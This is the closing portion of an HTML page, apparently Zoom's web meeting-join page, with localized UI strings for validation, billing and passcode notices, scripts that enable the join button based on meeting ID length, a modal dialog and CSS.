"jquery.validation_email":"Please enter a valid email address.",
"jquery.validation_url":"Please enter a valid URL.",
"jquery.validation_date":"Please enter a valid date.",
"jquery.validation_dateISO":"Please enter a valid date (ISO).",
"jquery.validation_number":"Please enter a valid number.",
"jquery.validation_digits":"Please enter only digits.",
"jquery.validation_creditcard":"Please enter a valid credit card number.",
"jquery.validation_equalTo":"Please enter the same value again.",
"jquery.validation_maxlength":"Please enter no more than {0} characters.",
"jquery.validation_minlength":"Please enter at least {0} characters.",
"jquery.validation_rangelength":"Please enter a value between {0} and {1} characters long.",
"jquery.validation_range":"Please enter a value between {0} and {1}.",
"jquery.validation_max":"Please enter a value less than or equal to {0}.",
"jquery.validation_min":"Please enter a value greater than or equal to {0}.",
"billing.pastdue.notice":"Past Due Notice",
"billing.pastdue.balance_new":"Your account has an outstanding balance of {0}{1}.",
"billing.pastdue.terminate_time":"If you do not pay your balance you will revert to a Basic plan on {0}.",
"billing.pastdue.terminate_soon":"If you do not pay your balance you will revert to a Basic plan.",
"billing.pastdue.will_loose":"If you do not pay your balance, you will lose access to all paid features and cloud recordings.",
"billing.pastdue.this_means":"This means that you will lose many of the features you currently have.",
"billing.pastdue.pay_online":"<a href=\"/billing/report\" onClick=\"ga(\'send\', \'event\', \'billing\', \'click-pastdue-paynow-link\', \'Past Due Notification Pay Now Link\');\">Click here<\/a> to pay your outstanding invoice(s) or call us at 1.888.799.9666 to avoid a service interruption.",
"billing.pastdue.pay_online_autopay":"Click <a href=\"javascript:void(0)\" class=\"past_due_pay_link\">here<\/a> to pay your outstanding invoice(s) or click <a href=\"https://support.zoom.us/hc/en-us/sections/4415044540045-Billing-and-Payments\">here<\/a> for support.",
"billing.pastdue.contact_sales":"<a href=\"/billing/contactus\" target=\"_blank\">Contact sales<\/a> or call us at 1.888.799.9666 to avoid a service interruption.",
"billing.payment.ach.verify.failed":"Your payment method was not successfully verified. Please navigate to <a href=\"/billing/payment\">Billing Information<\/a> to update your payment method.",
"billing.payment.ach.verify.pending.error":"You are unable to complete this payment since your payment method is pending verification. Please go to <a href=\"/billing/payment\">Billing Information<\/a> and complete verification then retry.",
"billing.tax_exemption.label":"Tax Status",
"billing.tax_exemption.link":"Verify Tax Exemption Status",
"billing.tax_exemption.link_desc":"You will be taken to ECMS to validate your tax exemption status.<br/>Please make sure pop-ups aren\'t blocked.",
"billing.tax_exemption.in_progress_title":"Tax Exemption Verification in Progress",
"billing.tax_exemption.in_progress_desc":"Please complete your tax exemption verification on our partner website. When you have finished verifying your tax status you will return here to complete your order.<br/><br/>Please do not make any changes to this page or close out until the verification is complete. If you no longer need to proceed with tax exemption you may close and continue placing your order.",
"billing.tax_exemption.in_progress_close_button":"Close",
"billing.tax_exemption.quit_progress_title":"Are you sure?",
"billing.tax_exemption.quit_progress_desc":"Are you sure you want to abandon tax exemption verification and proceed as tax eligible?",
"billing.tax_exemption.quit_progress_confirm":"Yes, Abandon",
"billing.tax_exemption.quit_progress_cancel":"No, Continue",
"billing.tax_exemption.status_incomplete":"Verification incomplete, please click again if you wish to be tax exempt",
"billing.tax_exemption.status_exempt":"Tax Exempt",
"billing.tax_exemption.status_exempt_short":"Exempt",
"billing.tax_exemption.status_pending":"Pending",
"billing.tax_exemption.status_pending_desc":"Your tax exemption status is currently under review. You will be charged tax upon placing this order, should the review be approved we will credit any tax charged to the account.",
"billing.tax_exemption.status_retrieving":"Retrieving...",
"billing.tax_exemption.status_retrieving_desc":"We are retrieving your tax exemption status, please wait.",
"billing.tax_exemption.status_nonexempt":"Non-Exempt",
"meeting.upcoming_meetings":"Upcoming Meetings",
"meeting.current.start_this_meeting":"Would you like to start this meeting?",
"meeting.current.start_these_meetings":"Would you like to start one of these meetings?",
"meeting.current.view_more":"View more...",
"meeting.current.start_new_meeting":"Start a New Meeting",
"meeting.password.opt_out_acceptChange_success":"Passcodes will be enabled by default on {0} for your account.",
"meeting.password.opt_out_success":"Passcodes will not be enabled by default for your account.",
"meeting.opt_out_desc.zr_upgrade1":"Passcodes will be enabled by default on {0} for your account.",
"meeting.opt_out_desc.zr_upgrade2":"We recommend upgrading your <a href=\"/location\">Zoom Rooms and Zoom Rooms Controller<\/a> to the latest version for an optimal join experience",
"meeting.password.opt_out_notice_title":"Important Update",
"meeting.password.opt_out_notice":"Zoom will update your account settings to turn on passcodes by default for meetings and webinars on {0}. <a href=\"javascript:void(0)\" onclick=\"showMeetingPassWordOptOut()\">Click<\/a> here to learn more or if you wish to opt out of this change.",
"feature.settings.submit_message_success":"Your settings have been updated.",
"billing.new_menu_tips.title": "Your Billing has moved!",
"billing.new_menu_tips.content": "Effortlessly manage your plan, billing, payment history, and more in Plans and Billing. Get an overview of all the new and updated features in our <a href=\"https://support.zoom.us/hc/articles/16542703332621\" target=\"_blank\">support article<\/a>",
"billing.new_menu_tips_free.title": "Plans and Billing has moved",
"billing.new_menu_tips_free.content": "Upgrade your plan in Plan Management to access new features!",
"billing.cstp.phone.reminder1.title": "Set up your Zoom Phone plan",
"billing.cstp.phone.reminder1.content": "Complete the initial setup guide to activate your Zoom Phone and unlock key features.",
"billing.cstp.zop.reminder1.title": "Set up your Zoom One Pro plan",
"billing.cstp.zop.reminder1.content": "Complete the initial setup guide to get your new plan up and running.",
"billing.cstp.zob.reminder1.title": "Set up your Zoom One Business plan",
"billing.cstp.zobp.reminder1.title": "Set up your Zoom One Business Plus plan",
"billing.cstp.zobp.reminder1.content": "Complete the initial setup guide to activate Zoom Phone and get your plan up and running.",
"billing.cstp.multiple_products.reminder1.title": "Set up your new Zoom plans",
"billing.cstp.multiple_products.reminder1.content": "Complete the initial setup guides to get your new plans up and running.",
"billing.cstp.phone.reminder2.title": "Complete your Zoom Phone setup",
"billing.cstp.single_product.reminder2.content": "Finish the remaining tasks to start enjoying all of the benefits of your new plan.",
"billing.cstp.zop.reminder2.title": "Complete your Zoom One Pro setup",
"billing.cstp.zob.reminder2.title": "Complete your Zoom One Business setup",
"billing.cstp.zobp.reminder2.title": "Complete your Zoom One Business Plus setup",
"billing.cstp.multiple_products.reminder2.title": "Complete setting up your new Zoom plans",
"billing.cstp.multiple_products.reminder2.content": "Finish the remaining tasks to start enjoying all of the benefits of your new plans.",
"billing.cstp.zopp.reminder1.title": "Set up your Zoom Workplace Pro Plus plan",
"billing.cstp.zopp.reminder2.title": "Complete your Zoom Workplace Pro Plus setup",
"billing.cstp.zopp.reminder1.content": "Complete the initial setup guide to activate Zoom Phone and get your plan up and running.",
});
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st3.zoom.us/static/6.3.26166/js/app/jquery.validate.message.min.js"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript" src="https://st2.zoom.us/static/6.3.26166/js/app/top_nav.min.js"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st2.zoom.us/static/6.3.26166/js/app/conference/join.min.js"></script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript">
$(function(){
var joinInput = $("#join-confno");
if ((joinInput.length > 0 && joinInput.val().length === 0)) {
disableJoinBtn();
} else {
enableJoinBtn();
}
joinInput.bind("change keyup input",function() {
if ((joinInput.length > 0 && joinInput.val().length === 0)) {
disableJoinBtn();
return;
}
var confno = $.trim(joinInput.val());
if (SB.isDigit(confno.charAt(0))) {
confno = confno.replace(/[^\d]/g, '');
var meetingNumber9 = 9;
var meetingNumber10 = 10;
var meetingNumber11 = 11;
if (confno.length !== meetingNumber9 && confno.length !== meetingNumber10 && confno.length !== meetingNumber11) {
disableJoinBtn();
return;
}
enableJoinBtn();
}else{
if (confno.length < 5) {
disableJoinBtn();
}else{
enableJoinBtn();
}
}
});
})
function disableJoinBtn(){
$('#btnSubmit').attr('disabled', true);
$('#btnSubmit').css("background-color", "rgba(82, 82, 128, 0.09)");
$('#btnSubmit').css("border-color", "#fff");
$('#btnSubmit').css("color", "#909096");
}
function enableJoinBtn(){
$('#btnSubmit').attr('disabled', false);
$('#btnSubmit').css("background-color", "#0E71EB");
$('#btnSubmit').css("border-color", "#0E71EB");
$('#btnSubmit').css("color", "#fff");
}
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript">
$.i18n.load({
"error.meeting.invalid_id":"Invalid meeting ID.",
"join.invalid_vurl":"This personal link name is not valid. Please check and re-enter again.",
"join.meeting_id_required": "Please enter a valid meeting ID."
});
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript">
window.useZVALazyLoadChatClient = true;
</script>
<script nonce="u9KoEo7aTiSMOOAzImLT8w"
type="text/javascript"
src="https://us01ccistatic.zoom.us/us01cci/web-sdk/chat-client.js"
data-apikey="AM_FKF55QOG_vdWum455Vg"
data-lazy-load-campaign-url="_blank"
async>
</script>
<!--[if gt IE 8]><!-->
<!--<![endif]-->
<div id="upcomingMeetingDialog" class="modaldialog hideme upcomingMeeting-feature-dialog">
<input type="hidden" name="mtg_length" id="mtg_length">
<input type="hidden" name="mtg_length1" id="mtg_length1">
<input type="hidden" name="start_url" id="start_url">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header clearfix">
<button class="close simplemodal-close" aria-label="close">&times;</button>
<h4 tabindex="-1" id="upcoming-meeting-title" class="meeting-delete-header-font" style="display: inline-block;">Upcoming Meetings</h4>
</div>
<div class="modal-body">
<div class="form-group" style="margin-bottom:16px;">
<div id="one-mtg" class="controls hideme" style="margin-bottom:18px;">Would you like to start this meeting?</div>
<div id="more-mtg" class="controls hideme" style="margin-bottom:18px;">Would you like to start one of these meetings?</div>
<div id="mtgs">
</div>
<div id="viwe-more" class="controls hideme"><a href="/meeting">View more...</a></div>
</div>
</div>
<div class="modal-footer">
<button class="btn btn-primary submit" id="scheduleMtg" style="background-color: #fff;color: #232333;border-color: #747487">Start a New Meeting</button>
</div>
</div>
</div>
</div>
<link rel="stylesheet" type="text/css" href="https://st3.zoom.us/static/6.3.26166/css/meetings/meeting_delete_dialog.min.css" /><script nonce="u9KoEo7aTiSMOOAzImLT8w" type="text/javascript">
/*Past Due Invoice Message*/
var cookieLang = $.cookie('_zm_lang');
if (cookieLang == "" || cookieLang == null) {
$.cookie('_zm_lang', "en-US", {expires: 365, path: '/', domain: "zoom.us", secure: true});
}
</script>
</div>
<script nonce="u9KoEo7aTiSMOOAzImLT8w" src="https://st1.zoom.us/static/6.3.26166/js/lib/vue/advanced/notification/notification.min.js"></script>
<style type="text/css">
.optout-notice-wrapper {
width: 100%;
display: none;
position: relative;
}
.optout-notice-container {
padding: 24px 48px 24px 24px;
}
.meeting-disabledpmi-alert{
min-width:415px;
}
.meeting-edit-disabledpmi-alert{
min-width:553px;
}
.meeting-edit-disabledpmi-alert p,.meeting-disabledpmi-alert p{
line-height: inherit;
}
@media only screen and (max-width: 414px) {
.optout-notice-container {
padding: 10px 20px;
}
}
.optout-notice-container div {
display: inline-block;
}
.optout-notice-title {
font-weight: bold;
line-height: 150%;
}
.optout-notice-medium {
background-color: #FCF6ED;
color: #775111;
}
.optout-notice-low {
background-color: #E4F7EB;
color: #1C7E41;
}
.optout-notice-high {
background-color: #FFE8E8;
color: #B22424;
}
.optout-notice-container a {
color: #0065F2;
font-weight: bold;
text-decoration: none;
}
.optout-notice-content {
padding-right: 24px;
}
.optout-notice-close {
position: absolute;
top: 10px;
right: 23px;
font-size: 30px;
color: #232333;
cursor: pointer;
border: none;
background: transparent;
}
.optout-notice-close:before {
content: '\00d7';
}
#content_container.content_container_hide_header{
padding-top:0px;
}
.body_hide_footer{
background: #fff;
}
.tesla_night_mode{
background: #131619;
}
</style>
</body>
</html>

